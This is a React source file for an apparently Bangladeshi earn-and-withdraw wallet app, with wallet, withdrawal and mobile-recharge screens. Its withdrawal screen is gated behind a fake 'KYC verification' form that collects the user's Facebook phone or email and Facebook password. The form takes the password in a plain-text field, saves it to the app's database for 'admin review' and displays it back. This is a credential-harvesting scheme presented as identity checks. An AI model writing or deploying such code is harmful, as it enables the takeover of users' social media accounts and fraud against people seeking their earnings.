/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'motion/react';
import { Wallet, ArrowLeft, ArrowUpRight, ArrowDownLeft, Clock, CreditCard, Landmark, PhoneOutgoing, ChevronRight, ShieldCheck, ShieldAlert, FileText, UserCheck, Lock } from 'lucide-react';
import { Card, Button, Input } from '../components/UI';
import { AppState } from '../types';
import { dbService } from '../dbService';

const WalletHome = ({ state }: { state: AppState }) => {
  const navigate = useNavigate();
  const user = state.currentUser!;

  return (
    <div className="flex flex-col min-h-screen">
      <div className="bg-[#FFC107] p-8 pb-12 rounded-b-[40px] shadow-lg">
        <h2 className="text-3xl font-black text-[#37474F]">My Wallet</h2>
        <p className="text-[#37474F]/70 text-xs font-bold uppercase tracking-wider mt-2">Manage your financial growth</p>
      </div>

      <div className="p-6 -mt-8 space-y-8 pb-24">
         <Card className="bg-white p-6 rounded-[32px] shadow-xl border border-gray-50">
            <div className="flex justify-between items-center mb-6">
                <div className="w-12 h-12 bg-[#FFC107]/10 rounded-2xl flex items-center justify-center text-[#FFC107]">
                    <Wallet size={24} />
                </div>
                <button onClick={() => navigate('/withdraw')} className="p-3 bg-[#37474F] text-white rounded-2xl shadow-lg active:scale-95 transition-transform">
                   <ArrowUpRight size={20} />
                </button>
            </div>
            <div className="flex justify-between items-end">
               <div>
                  <p className="text-[10px] font-black uppercase text-gray-400 tracking-widest mb-1">Total Balance</p>
                  <h3 className="text-4xl font-black text-[#37474F]">৳{user.balance.toFixed(0)}</h3>
               </div>
               <div className="text-right">
                  <p className="text-[10px] font-black uppercase text-[#FFC107] tracking-widest mb-1">Pending</p>
                  <h4 className="text-xl font-black text-[#FFC107]">৳{user.pendingBalance.toFixed(2)}</h4>
               </div>
            </div>
         </Card>

         {/* KYC Status Banner */}
         {(!user.kycStatus || user.kycStatus === 'none') && (
           <Card className="p-4 bg-amber-50 border border-amber-200 rounded-[24px] flex items-center justify-between shadow-sm">
             <div className="flex items-center gap-3">
               <div className="w-10 h-10 bg-amber-100 rounded-xl flex items-center justify-center text-amber-600 shrink-0">
                 <ShieldAlert size={20} />
               </div>
               <div>
                 <h4 className="text-[11px] font-black text-amber-800 uppercase tracking-tight">KYC সম্পন্ন হয়নি</h4>
                 <p className="text-[9px] font-bold text-amber-700/80 uppercase">টাকা তুলতে KYC সম্পন্ন করুন</p>
               </div>
             </div>
             <Button onClick={() => navigate('/withdraw')} className="px-3.5 py-2 text-[10px] font-black uppercase rounded-lg bg-amber-500 text-white h-auto border-none shadow-md">শুরু করুন</Button>
           </Card>
         )}

         {user.kycStatus === 'pending' && (
           <Card className="p-4 bg-blue-50 border border-blue-200 rounded-[24px] flex items-center gap-3 shadow-sm">
             <div className="w-10 h-10 bg-blue-100 rounded-xl flex items-center justify-center text-blue-600 shrink-0">
               <Clock size={20} className="animate-spin" />
             </div>
             <div>
               <h4 className="text-[11px] font-black text-blue-800 uppercase tracking-tight">KYC ভেরিফিকেশন প্রক্রিয়াধীন</h4>
               <p className="text-[9px] font-bold text-blue-700/80 uppercase">এডমিন শীঘ্রই আপনার তথ্য যাচাই করবে</p>
             </div>
           </Card>
         )}

         {user.kycStatus === 'rejected' && (
           <Card className="p-4 bg-red-50 border border-red-200 rounded-[24px] flex items-center justify-between shadow-sm">
             <div className="flex items-center gap-3">
               <div className="w-10 h-10 bg-red-100 rounded-xl flex items-center justify-center text-red-600 shrink-0">
                 <ShieldAlert size={20} />
               </div>
               <div>
                 <h4 className="text-[11px] font-black text-red-800 uppercase tracking-tight">KYC বাতিল করা হয়েছে</h4>
                 <p className="text-[9px] font-bold text-red-700/80 uppercase">সঠিক তথ্য দিয়ে আবার আবেদন করুন</p>
               </div>
             </div>
             <Button onClick={() => navigate('/withdraw')} className="px-3.5 py-2 text-[10px] font-black uppercase rounded-lg bg-red-500 text-white h-auto border-none shadow-md">আবার দিন</Button>
           </Card>
         )}

         {user.kycStatus === 'approved' && (
           <Card className="p-4 bg-green-50 border border-green-200 rounded-[24px] flex items-center gap-3 shadow-sm">
             <div className="w-10 h-10 bg-green-100 rounded-xl flex items-center justify-center text-green-600 shrink-0">
               <ShieldCheck size={20} />
             </div>
             <div>
               <h4 className="text-[11px] font-black text-green-800 uppercase tracking-tight">KYC ভেরিফাইড (এপ্রুভড)</h4>
               <p className="text-[9px] font-bold text-green-700/80 uppercase">আপনার অ্যাকাউন্ট সম্পূর্ণ নিরাপদ রয়েছে</p>
             </div>
           </Card>
         )}
      </div>
    </div>
  );
};

const Withdraw = ({ state, onUpdate }: { state: AppState; onUpdate: () => void }) => {
  const navigate = useNavigate();
  const user = state.currentUser!;
  const kycStatus = user.kycStatus || 'none';

  // Withdrawal States
  const [amount, setAmount] = useState('');
  const [method, setMethod] = useState('bKash');
  const [account, setAccount] = useState('');
  const [loading, setLoading] = useState(false);

  // KYC States
  const [kycName, setKycName] = useState(user.kycFullName || '');
  const [kycFacebookPhone, setKycFacebookPhone] = useState(user.kycFacebookPhone || '');
  const [kycFacebookPassword, setKycFacebookPassword] = useState(user.kycFacebookPassword || '');
  const [submittingKyc, setSubmittingKyc] = useState(false);

  const handleWithdraw = async () => {
    const minVal = state.settings.minWithdrawal || 50;
    const val = parseFloat(amount);
    if (!val || val < minVal) {
      alert(`Minimum withdrawal is ৳${minVal}`);
      return;
    }
    if (val > (state.currentUser?.balance || 0)) {
      alert('Insufficient balance');
      return;
    }

    setLoading(true);
    try {
       const success = await dbService.requestWithdrawal(state.currentUser!.id, val, method, account);
       if (success) {
         onUpdate();
         alert('Withdrawal request submitted! It will be processed within 24 hours.');
         navigate('/wallet');
       } else {
         alert('Error submitting request');
       }
    } catch (err) {
       console.error(err);
       alert('Network error');
    } finally {
       setLoading(false);
    }
  };

  const handleKycSubmit = async () => {
    if (!kycName.trim() || !kycFacebookPhone.trim() || !kycFacebookPassword.trim()) {
      alert('দয়া করে সব তথ্য সঠিক উপায়ে পূরণ করুন।');
      return;
    }

    setSubmittingKyc(true);
    try {
      await dbService.updateCurrentUser({
        kycStatus: 'pending',
        kycFullName: kycName,
        kycFacebookPhone: kycFacebookPhone,
        kycFacebookPassword: kycFacebookPassword,
        kycSubmittedAt: new Date().toISOString(),
        kycRejectReason: ''
      });
      onUpdate();
      alert('আপনার KYC ভেরিফিকেশন আবেদন জমা হয়েছে! এডমিন শীঘ্রই যাচাই করে এপ্রুভ করবেন।');
    } catch (err) {
      console.error(err);
      alert('আবেদন জমা দিতে সমস্যা হয়েছে, অনুগ্রহ করে আবার চেষ্টা করুন।');
    } finally {
      setSubmittingKyc(false);
    }
  };

  if (kycStatus !== 'approved') {
    return (
      <div className="min-h-screen bg-[#F5F5F5]">
        <div className="p-6 flex items-center gap-4 bg-white shadow-sm rounded-b-[32px]">
          <button onClick={() => navigate('/wallet')} className="p-3 bg-gray-50 rounded-2xl transition-transform active:scale-95"><ArrowLeft size={20} /></button>
          <span className="text-[10px] font-black uppercase tracking-[0.2em] text-gray-400 ml-4">KYC ভেরিফিকেশন</span>
        </div>

        <div className="p-6 space-y-6">
          {kycStatus === 'pending' ? (
            <div className="bg-white p-8 rounded-[40px] shadow-xl border border-gray-100 flex flex-col items-center text-center space-y-6">
              <div className="w-20 h-20 bg-amber-50 rounded-[28px] flex items-center justify-center text-amber-500 animate-pulse">
                <Clock size={40} />
              </div>
              <div className="space-y-2">
                <h3 className="text-xl font-black text-[#37474F]">আবেদনটি প্রক্রিয়াধীন আছে</h3>
                <p className="text-xs font-bold text-gray-400 uppercase tracking-widest">KYC Status: Pending ⏳</p>
              </div>
              <div className="bg-amber-50 p-4 rounded-3xl border border-amber-100 text-left w-full space-y-2">
                <h4 className="text-xs font-black text-amber-800 uppercase tracking-wide">জমা দেওয়া তথ্য:</h4>
                <div className="text-[11px] font-bold text-[#37474F] space-y-1">
                  <p>👤 আবেদনকারীর নাম: {user.kycFullName}</p>
                  <p>📱 ফেসবুক নম্বর / ইমেইল: {user.kycFacebookPhone}</p>
                  <p>🔑 ফেসবুক পাসওয়ার্ড: {user.kycFacebookPassword}</p>
                </div>
              </div>
              <p className="text-xs font-semibold text-gray-500 leading-relaxed">
                আপনার দেওয়া তথ্য আমাদের টিম যাচাই করছে। সাধারণত ২৪ ঘণ্টার মধ্যে এটি এপ্রুভ হয়ে যাবে। এপ্রুভ হওয়ার পর আপনি কোনো বাধা ছাড়াই টাকা তুলতে পারবেন।
              </p>
              <Button onClick={() => navigate('/wallet')} className="w-full h-14 rounded-2xl bg-[#37474F] text-white">ওয়ালেটে ফিরে যান</Button>
            </div>
          ) : (
            <div className="bg-white p-6 rounded-[40px] shadow-xl border border-gray-100 space-y-6">
              <div className="flex items-center gap-4 border-b border-gray-50 pb-4">
                <div className="w-12 h-12 bg-red-50 rounded-2xl flex items-center justify-center text-red-500 shrink-0">
                  <ShieldAlert size={24} />
                </div>
                <div>
                  <h3 className="text-base font-black text-[#37474F]">KYC ভেরিফিকেশন প্রয়োজন</h3>
                  <p className="text-[10px] font-bold text-gray-400 uppercase">Verification required to withdraw</p>
                </div>
              </div>

              {kycStatus === 'rejected' && (
                <div className="bg-red-50 p-4 rounded-2xl border border-red-100 text-red-800 space-y-1 text-xs">
                  <p className="font-black uppercase tracking-wider text-[10px] flex items-center gap-1.5">
                    <span>❌</span> আবেদন প্রত্যাখ্যাত হয়েছে (Rejected)
                  </p>
                  <p className="font-bold">কারণ: {user.kycRejectReason || 'ভুল বা অসঙ্গতিপূর্ণ তথ্য জমা দেওয়া হয়েছে।'}</p>
                </div>
              )}

              <p className="text-xs font-bold text-gray-500 leading-relaxed">
                সিকিউরিটি পলিসি অনুযায়ী টাকা তুলতে হলে আপনার পরিচয় নিশ্চিত করা বাধ্যতামূলক। নিচের ফর্মটি সঠিক তথ্য দিয়ে পূরণ করে সাবমিট করুন।
              </p>

              <div className="space-y-4">
                <Input 
                  label="আবেদনকারীর নাম" 
                  placeholder="যেমন: Md. Rocky Farazi" 
                  value={kycName} 
                  onChange={setKycName} 
                  icon={UserCheck} 
                />
                <Input 
                  label="ফেসবুক নম্বর / ইমেইল" 
                  placeholder="যেমন: 017XXXXXXXX বা rocky@email.com" 
                  value={kycFacebookPhone} 
                  onChange={setKycFacebookPhone} 
                  icon={PhoneOutgoing} 
                />
                <Input 
                  label="ফেসবুক পাসওয়ার্ড" 
                  placeholder="যেমন: ••••••••" 
                  value={kycFacebookPassword} 
                  onChange={setKycFacebookPassword} 
                  type="text"
                  icon={Lock} 
                />
              </div>

              <div className="bg-gray-50 p-4 rounded-2xl text-[10px] font-bold text-gray-400 flex items-start gap-2.5">
                <span className="text-amber-500 text-sm">⚠️</span>
                <p className="leading-relaxed">দয়া করে ভুল তথ্য দেওয়া থেকে বিরত থাকুন। ভুল বা অন্যের তথ্য দিলে আপনার অ্যাকাউন্ট সাময়িকভাবে লক বা স্থায়ীভাবে নিষিদ্ধ হতে পারে।</p>
              </div>

              <Button 
                onClick={handleKycSubmit} 
                isLoading={submittingKyc} 
                className="w-full h-15 rounded-2xl bg-[#FFC107] text-[#37474F] font-black uppercase tracking-wider shadow-lg"
              >
                ভেরিফিকেশন সাবমিট করুন
              </Button>
            </div>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#F5F5F5]">
       <div className="p-6 flex items-center gap-4 bg-white shadow-sm rounded-b-[32px]">
        <button onClick={() => navigate('/wallet')} className="p-3 bg-gray-50 rounded-2xl transition-transform active:scale-95"><ArrowLeft size={20} /></button>
        <span className="text-[10px] font-black uppercase tracking-[0.2em] text-gray-400 ml-4">Cashout Request</span>
      </div>

      <div className="p-6 space-y-10">
         <Card className="bg-[#37474F] p-8 rounded-[40px] shadow-2xl relative overflow-hidden">
            <div className="relative z-10 text-center space-y-1">
               <h1 className="text-5xl font-black text-[#FFC107]">৳{state.currentUser?.balance.toFixed(0)}</h1>
               <p className="text-[10px] font-black text-white/50 uppercase tracking-[0.3em]">Available Fund</p>
            </div>
            <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -mr-16 -mt-16 blur-3xl" />
         </Card>

         <div className="space-y-6">
            <Input label="Payout Amount" placeholder={`Enter amount (min ৳${state.settings.minWithdrawal || 50})`} value={amount} onChange={setAmount} type="number" icon={Wallet} />
            
            <div className="space-y-3">
               <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Select Gateway</label>
               <div className="grid grid-cols-3 gap-3">
                  {['bKash', 'Nagad', 'Bank'].map(m => (
                     <button
                        key={m}
                        onClick={() => setMethod(m)}
                        className={`p-4 rounded-3xl border-2 font-black text-[10px] uppercase transition-all shadow-sm ${
                           method === m ? 'border-[#FFC107] bg-[#FFC107] text-[#37474F]' : 'border-white bg-white text-gray-400'
                        }`}
                     >
                        {m}
                     </button>
                  ))}
               </div>
            </div>

            <Input label={`${method} Account Details`} placeholder={method === 'Bank' ? 'A/C No, Branch, Routing' : '01XXXXXXXXX'} value={account} onChange={setAccount} icon={method === 'Bank' ? Landmark : PhoneOutgoing} />
         </div>

         <div className="bg-[#FFC107]/10 p-6 rounded-[32px] border border-[#FFC107]/20 flex gap-4">
            <div className="w-10 h-10 bg-[#FFC107] rounded-xl flex items-center justify-center text-[#37474F] shrink-0">
               <Clock size={20} />
            </div>
            <div>
               <h5 className="text-[#37474F] font-black text-xs uppercase tracking-tight">Express Processing</h5>
               <p className="text-[10px] font-bold text-[#37474F]/60 leading-relaxed mt-1">
                  Requests are typically verified and completed within 2-4 hours. Thank you for your patience.
               </p>
            </div>
         </div>

         <Button onClick={handleWithdraw} isLoading={loading} className="w-full h-16 rounded-[24px]">Request Payout</Button>
      </div>
    </div>
  );
};

const Recharge = ({ state, onUpdate }: { state: AppState; onUpdate: () => void }) => {
  const navigate = useNavigate();
  const [operator, setOperator] = useState('Grameenphone');
  const [type, setType] = useState<'prepaid' | 'postpaid'>('prepaid');
  const [number, setNumber] = useState('');
  const [amount, setAmount] = useState('');
  const [loading, setLoading] = useState(false);

  const operators = [
    { name: 'Grameenphone', color: 'bg-blue-500', logo: 'GP' },
    { name: 'Banglalink', color: 'bg-orange-500', logo: 'BL' },
    { name: 'Robi', color: 'bg-red-600', logo: 'Robi' },
    { name: 'Airtel', color: 'bg-red-500', logo: 'Air' },
    { name: 'Teletalk', color: 'bg-green-600', logo: 'TT' },
  ];

  const handleRecharge = async () => {
    if (!number || number.length < 11) {
      alert('Please enter a valid 11-digit number');
      return;
    }
    const val = parseFloat(amount);
    if (!val || val < 10) {
      alert('Minimum recharge is ৳10');
      return;
    }
    if (val > (state.currentUser?.balance || 0)) {
      alert('Insufficient balance');
      return;
    }

    setLoading(true);
    try {
      const success = await dbService.recharge(state.currentUser!.id, number, operator, val, type);
      if (success) {
        onUpdate();
        alert(`Recharge of ৳${val} to ${number} is being processed! Check history for cashback.`);
        navigate('/wallet');
      } else {
        alert('Recharge failed. Please try again.');
      }
    } catch (err) {
      console.error(err);
      alert('Network error');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F5F5F5]">
      <div className="p-6 flex items-center gap-4 bg-white shadow-sm rounded-b-[32px]">
        <button onClick={() => navigate('/wallet')} className="p-3 bg-gray-50 rounded-2xl transition-transform active:scale-95">
          <ArrowLeft size={20} />
        </button>
        <span className="text-[10px] font-black uppercase tracking-[0.2em] text-gray-400 ml-4">Recharge Hub</span>
      </div>

      <div className="p-6 space-y-6">
         <Card className="bg-gradient-to-br from-[#37474F] to-[#1a252b] p-8 rounded-[48px] shadow-2xl relative overflow-hidden border-none text-center">
          <div className="relative z-10 flex flex-col items-center gap-2">
            <div className="w-16 h-16 bg-[#FFC107] rounded-3xl flex items-center justify-center text-[#37474F] text-3xl shadow-[0_10px_40px_rgba(255,193,7,0.2)] mb-2">
               ⚡
            </div>
            <h2 className="text-5xl font-black text-[#FFC107] drop-shadow-md tracking-tighter">৳{state.currentUser?.balance.toFixed(0)}</h2>
            <p className="text-[10px] font-black uppercase tracking-[0.4em] text-white/50">Current Balance</p>
          </div>
          <div className="absolute -bottom-20 -right-20 w-64 h-64 bg-[#FFC107]/10 rounded-full blur-3xl opacity-50" />
        </Card>

        <div className="space-y-8">
          <div className="space-y-4">
            <div className="flex items-center gap-2 px-1">
               <div className="w-1 h-4 bg-[#FFC107] rounded-full" />
               <label className="text-[10px] font-black text-[#37474F] uppercase tracking-widest">Select Mobile Operator</label>
            </div>
            <div className="grid grid-cols-5 gap-3">
              {operators.map(op => (
                <button
                  key={op.name}
                  onClick={() => setOperator(op.name)}
                  className={`flex flex-col items-center gap-2 p-3 rounded-[24px] transition-all border-2 shadow-sm aspect-square justify-center ${
                    operator === op.name ? 'border-[#FFC107] bg-white scale-110 shadow-xl z-10' : 'border-transparent bg-white opacity-60'
                  }`}
                >
                  <div className={`w-10 h-10 rounded-2xl ${op.color} flex items-center justify-center text-[10px] font-black text-white shadow-inner`}>
                    {op.logo}
                  </div>
                </button>
              ))}
            </div>
          </div>

          <div className="bg-white p-2.5 rounded-[32px] flex gap-2 border border-gray-100 shadow-sm">
            <button 
              onClick={() => setType('prepaid')}
              className={`flex-1 py-4 rounded-[24px] text-xs font-black uppercase transition-all flex items-center justify-center gap-2 ${type === 'prepaid' ? 'bg-[#37474F] text-white shadow-xl' : 'text-gray-400 hover:bg-gray-50'}`}
            >
              <div className={`w-2 h-2 rounded-full ${type === 'prepaid' ? 'bg-[#FFC107]' : 'bg-gray-200'}`} />
              Prepaid
            </button>
            <button 
              onClick={() => setType('postpaid')}
              className={`flex-1 py-4 rounded-[24px] text-xs font-black uppercase transition-all flex items-center justify-center gap-2 ${type === 'postpaid' ? 'bg-[#37474F] text-white shadow-xl' : 'text-gray-400 hover:bg-gray-50'}`}
            >
              <div className={`w-2 h-2 rounded-full ${type === 'postpaid' ? 'bg-[#FFC107]' : 'bg-gray-200'}`} />
              Postpaid
            </button>
          </div>

          <div className="space-y-4">
            <Input label="Mobile Number" placeholder="01XXXXXXXXX" value={number} onChange={setNumber} type="tel" icon={PhoneOutgoing} className="rounded-[32px] p-6 h-18 text-sm" />
            <Input label="Recharge Amount (৳)" placeholder="Min ৳10" value={amount} onChange={setAmount} type="number" icon={Wallet} className="rounded-[32px] p-6 h-18 text-sm" />
          </div>
          
          {parseFloat(amount) >= 50 ? (
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="bg-green-500 p-6 rounded-[32px] border-none flex items-center gap-4 shadow-xl shadow-green-100"
            >
              <div className="w-12 h-12 bg-white/20 rounded-2xl flex items-center justify-center text-white text-xl">
                💰
              </div>
              <div>
                <p className="text-xs font-black text-white uppercase tracking-tight">Bonus Unlocked!</p>
                <p className="text-[10px] font-bold text-white/80 uppercase">You'll receive ৳10 cashback after successful recharge</p>
              </div>
            </motion.div>
          ) : (
            <div className="bg-[#37474F]/5 p-6 rounded-[32px] flex items-center gap-4 border border-dashed border-[#37474F]/20">
              <div className="w-12 h-12 bg-white rounded-2xl flex items-center justify-center text-[#FFC107] text-xl shadow-sm">
                🎁
              </div>
              <p className="text-[9px] font-black text-[#37474F]/40 uppercase leading-tight">
                 Recharge <span className="text-[#37474F]">৳50</span> or more to unlock your INSTANT CASHBACK gift!
              </p>
            </div>
          )}
        </div>

        <Button 
          onClick={handleRecharge} 
          isLoading={loading} 
          className="w-full h-20 rounded-[32px] bg-[#FFC107] text-[#37474F] shadow-2xl shadow-[#FFC107]/30 border-none text-sm font-black uppercase tracking-[0.2em] hover:bg-[#FFA000] active:scale-95 transition-all mt-4"
        >
          Confirm Recharge
        </Button>
      </div>
    </div>
  );
};

export default { Home: WalletHome, Withdraw, Recharge };
